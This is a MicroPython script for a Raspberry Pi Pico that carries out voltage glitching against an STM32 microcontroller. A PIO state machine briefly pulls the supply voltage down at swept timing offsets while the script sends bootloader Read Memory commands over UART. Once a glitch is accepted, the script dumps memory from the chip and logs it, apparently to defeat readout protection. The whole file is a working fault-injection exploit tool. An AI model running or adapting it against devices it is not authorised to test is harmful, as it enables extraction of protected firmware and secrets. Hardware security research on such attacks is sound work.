import time, sys, uselect, struct, math
from machine import Pin, UART
from rp2 import PIO, asm_pio, StateMachine

# Set the Gate of the Driver MOSFET to HIGH for a short period, driving the voltage down. Glitches the STM32. (See sketch schematics)
@asm_pio(set_init = rp2.PIO.OUT_LOW, out_shiftdir=PIO.SHIFT_RIGHT, autopull=True, pull_thresh=16)
def drop_voltage():
    # Delay and Glitch durations are all inside the 32bit string.
    # Bits 0-4 is used for delay duration (32 cycle loop)
    # Bits 5-9 is used for delay duration (2 cycle loop)
    # Bits 10-14 is used for glitch duration
    pull()
    mov(isr, osr)
    
    # Start of program
    label("Prog_Start")
    
    set(x, 5)
    # Waits for the 6th Rising Edge from Pin 4 before glitching with Pin 3
    label("rising_edge_wait")
    wait(1, pin, 0)
    wait(0, pin, 0)
    jmp(x_dec, "rising_edge_wait")
    
    wait(1, pin, 0)

    # Move/Reloads the glitch timing and delay into the x and y registers
    out(x, 5)		#x contains the delay duration (2 cycle loop) 
    out(y, 5)		#y contains the delay duration (32 cycle loop)
    #nop()			#The 5 LSB of OSR should now contain the glitch duration
    
    # 2 cycle delay
    label("delay_short")
    nop()		
    jmp(x_dec, "delay_short")
    
    #nop()
    
    # Skips 32 cycle delay and goes to glitch
    jmp(not_y, "Glitch")
    
    # 32 cycle delay
    label("delay_long")
    nop()		[30]
    jmp(y_dec, "delay_long")
    
    label("Glitch")
    # Moves the glitch timing to scratch register X
    mov(x, osr)
    
    # Set Pin 3 to High. Induces Glitch
    set(pins, 1)
    
    # Glitch timing
    label("glitch_timing")
    nop()
    jmp(x_dec, "glitch_timing")
    
    nop()

    # Set Pin 3 to Low. Return opertaions as per normal
    set(pins, 0)
    
    # Delay to allow the STM to get back to operating voltage
    set(x, 31)
    label("delay_low_outer")
    set(y, 2)
    label("delay_low_inner")
    nop()			[31]
    jmp(y_dec, "delay_low_inner")
    jmp(x_dec, "delay_low_outer")
    
    # Reloads the original value back into OSR
    mov(osr, isr)
    # Wait for Falling edge so the PIO does not continually glitch
    #wait(0, pin, 0)
    jmp("Prog_Start")
    
@asm_pio(set_init = rp2.PIO.OUT_LOW, out_shiftdir=PIO.SHIFT_RIGHT, autopull=True, pull_thresh=16)
def reset():
    set(pins, 1)
    nop()		[31]
    set(pins, 0)
    nop()		[31]    

# Set Pin 3 output drive strength to be 12mA, slew to be fast. Refer to rp2040 datasheet, PADS_BANK0
machine.mem32[0x4001c010]=0x7f

# Open a file from the Pico's onchip flash memory
fd = open("output.txt", "a")

#Reset_Flag
rst_flag = 0

# Bit String
bit_string = 0

# Switch ON the on-board LED.
led = Pin("LED", Pin.OUT)
led.value(1)

# NRST for STM32
NRST = Pin(10, Pin.OUT)
NRST.value(1)

# Initialize UART
# When connected in Normal operation, parity = None
# When connected in Bootloader mode, partity = 0 (EVEN)
uart = UART(0, baudrate=115200, tx=Pin(12), rx=Pin(13))
uart.init(bits=8, parity=0, stop=1)

# Sets up the comms btw Pico and Thonny IDE
spoll=uselect.poll()
spoll.register(sys.stdin,uselect.POLLIN)

# Command to enter bootloader mode
cmd = struct.pack('B', 0x7f)
uart.write(cmd)
received = struct.unpack('b', uart.read())
print(hex(received))

def read1():
    return(sys.stdin.read(1) if spoll.poll(0) else None)

def readline():
    c = read1()
    buffer = ""
    while c != None:
        buffer += c
        c = read1()
    return buffer             


def calc_glitch_cycles(duration):
    #nop() [11] gives a reliable glitch time of 160ns. Each extra clock cycle adds 10ns.
    cycles = 5 + (int(duration) - 160) / 20
    return cycles


while True:
    for i in range (140, 160, 20): #glitch duration. Accurate to ~20ns
        for j in range(9500, 10700, 20): #delay duration. Accurate to ~20ns. Maximum up to 10700

            t_end = time.time() + 2
            #fd.write(f"Glitch duration: {i}, Delay Duration {j} \n")
            
            glitch_cycles = calc_glitch_cycles(i)
            bit_string = int(glitch_cycles) << 10		#Logical shift left by 10 bits
            #print(glitch_cycles)
            print(f"Glitch duration: {i}")
            print(f"Delay duration: {j}")
            
            if (j < 780):
                #~90ns of delay is due to current travel time(?). Was mentioned before in one of the meetings. 
                delay_cycles = (j - 140 )/20	# At least 4 cycles is being used for delay. 
                bit_string = bit_string + int(delay_cycles)		# No need to shift 2 cycle delay as they are the 5 LSB
            else:
                long_delay_cycles = math.floor((j - 140) / 320) 
                delay_cycles = math.floor((j - (long_delay_cycles *320) - 110 ) / 20) #~90ns of delay + 10ns of delay to copy osr into x
                long_delay_cycles = long_delay_cycles - 1 # Loops in PIO index starts at 0
                delay_cycles = delay_cycles -1
                bit_string = bit_string + (long_delay_cycles << 5)
                bit_string = bit_string + delay_cycles
                #print(f"long delay cycle: {long_delay_cycles}")
            #print(f"Delay Cycles: {delay_cycles}")
            print(f"Bit_string: {bit_string}")
            print("")
            
            sm = StateMachine(0, drop_voltage, freq = 100_000_000, set_base = Pin(3), in_base = Pin(4))
            sm.put(bit_string)
            sm.active(1)

            while time.time() < t_end:
                # Read Memory Commands Start
                try:
                    # Select Read Memory Command & trigger rising edge
                    cmd = struct.pack('B', 0x11)
                    uart.write(cmd)
                    cmd = struct.pack('B', 0xee)
                    uart.write(cmd)
                    
                    received, = struct.unpack('b', uart.read())
                    
                    # Checks if ACK or NACK is sent. If NACK is received, does not enter if statement and tries to glitch again
                    
                    if (received == -1 or received == 1):
                        print(f"Glitched: {received}")

                        continue

                    if (received != 0x1f):
                        # ACK is received
                        print("Glitched")
                        print(received)
                        
                        #stop the SM from glitching
                        sm.active(0)
                        
                        #Vary this from 0x1ffff000 to 0x1fffffff
                        '''
                        #this format does not work
                        cmd = struct.pack('B', 0x08, 0x01, 0xFC, 0x00, 0xF5)
                        uart.write(cmd)
                
                        '''
                        cmd = struct.pack('B', 0x20)
                        uart.write(cmd)
                        cmd = struct.pack('B', 0x00)
                        uart.write(cmd)
                        cmd = struct.pack('B', 0x10)
                        uart.write(cmd)
                        cmd = struct.pack('B', 0x00)
                        uart.write(cmd)
                        cmd = struct.pack('B', 0x30)
                        uart.write(cmd)
                        
                        received, = struct.unpack('b', uart.read())
                        
                        cmd = struct.pack('B', 0xff)
                        uart.write(cmd)
                        cmd = struct.pack('B', 0x00)
                        uart.write(cmd)
                        
                        received = uart.read().hex()
                        print(received)
                        fd.write(f"Glitch duration: {i}, Delay Duration {j} \n")
                        fd.write(received)
                        #quit()
                        
                        # Reenable State Machine to glitch next loop
                        sm.active(1)
                        sys.exit()
                    
                        
                    print(received)
                    time.sleep(0.01)
                    
                except:
                    print("reset")
                    NRST.value(0)
                    time.sleep(0.5)
                    NRST.value(1)
                    time.sleep(0.5)
                    cmd = struct.pack('B', 0x7f)
                    uart.write(cmd)
                    received = struct.unpack('b', uart.read())
                    print(hex(received))
                    
                ''' 
                except:
                    
                    print("Reset")
                    
                    #Reset stm if no input has been received within 1 sec
                    sm = StateMachine(0, reset, freq = 2_000, set_base = Pin(3))
                    sm.active(1)
                    
                    tx = Pin(12, Pin.OUT)
                    rx = Pin(13, Pin.OUT)
                    tx.value(0)
                    rx.value(0)
                    
                    time.sleep(0.5)
                    sm.active(0)
                    
                    uart = UART(0, baudrate=115200, tx=Pin(12), rx=Pin(13))
                    uart.init(bits=8, parity=0, stop=1)
                    
                    
                    time.sleep(0.5)
                    sm = StateMachine(0, drop_voltage, freq = 100_000_000, set_base = Pin(3), in_base = Pin(4))
                    sm.put(bit_string)
                    sm.active(1)
                    
                    cmd = struct.pack('B', 0x7f)
                    uart.write(cmd)
                    received = struct.unpack('b', uart.read())
                    print(hex(received))
                    '''
                        
                

                
                
                
                
                
                
